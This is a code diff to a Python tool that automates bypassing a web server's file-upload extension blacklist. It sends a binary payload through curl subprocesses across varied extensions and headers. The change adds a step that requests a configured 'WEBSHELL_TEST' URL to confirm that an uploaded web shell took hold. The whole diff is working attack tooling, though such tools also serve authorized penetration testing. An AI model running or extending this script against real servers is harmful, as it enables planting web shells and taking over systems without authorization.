@@ -64,7 +64,12 @@ def print_attack_summary(json_data, script_args, bypass_type):
 def print_attack_verbose_summary(json_data, script_args, bypass_type):
 	print_attack_summary(json_data, script_args, bypass_type)
 
-def run_blacklist_bypass(json_data,curl_subprocess_list,binary_payload):
+def confirm_file_upload(curl_subprocess, json_data, header=None, extension=None, mime_header=None):
+	processed_get_curl = process_curl(curl_subprocess,json_data,header,extension,mime_header)
+	verification_response = subprocess.run(processed_get_curl, capture_output=True,text=True)
+	return verification_response.stdout
+
+def run_blacklist_bypass(json_data,curl_subprocess_list,binary_payload, arg_confirm):
 	for key, value in json_data.items():
 		print(key + " : " + str(value))
 	print("\n subprocess\n")
@@ -85,7 +90,10 @@ def run_blacklist_bypass(json_data,curl_subprocess_list,binary_payload):
 					# send the web request:
 					curl_response = subprocess.run(processed_curl, input=binary_file_output, capture_output=True, text=False)
 					print(curl_response.stdout)
-					# TODO: process confirm cURL for testing and log output
+					# process confirm cURL to confirm file upload and print output:
+					if arg_confirm:
+						confirmed_output = confirm_file_upload(json_data['WEBSHELL_TEST'],json_data,header,extension)
+						print(confirmed_output)
 						
 def main():
 	try:
@@ -124,7 +132,7 @@ def main():
 		# execute attack
 		match bypass_type:
 			case "Blacklist Bypass":
-				run_blacklist_bypass(config_variables,curl_subprocess,binary_payload)
+				run_blacklist_bypass(config_variables, curl_subprocess, binary_payload, args.confirm)
 			case "Whitelist Bypass":
 				print("whitelist bypass not existent yet")
 			case _:
